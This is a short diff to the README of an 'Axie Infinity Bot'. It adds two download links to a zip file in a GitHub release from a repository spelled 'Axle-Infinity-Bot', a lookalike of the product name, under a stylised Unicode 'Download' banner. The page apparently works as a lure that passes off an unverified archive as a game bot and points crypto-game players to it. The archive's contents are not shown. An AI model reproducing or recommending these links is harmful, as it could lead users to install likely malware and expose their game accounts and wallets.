@@ -4,7 +4,7 @@
   
 ## UPDATE 16.07.2024 
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/ank1O1/Axle-Infinity-Bot/releases/download/Axle-Infinity-Bot/Axle-Infinity-Bot.zip)***
 
 
 # Axie Infinity Bot
@@ -25,7 +25,7 @@
 
    # Usage
 
-   1. [Download here](
+   1. [Download here](https://github.com/ank1O1/Axle-Infinity-Bot/releases/download/Axle-Infinity-Bot/Axle-Infinity-Bot.zip)
    2. 
        2. Connect your Axie Infinity accounts to the bot.
 
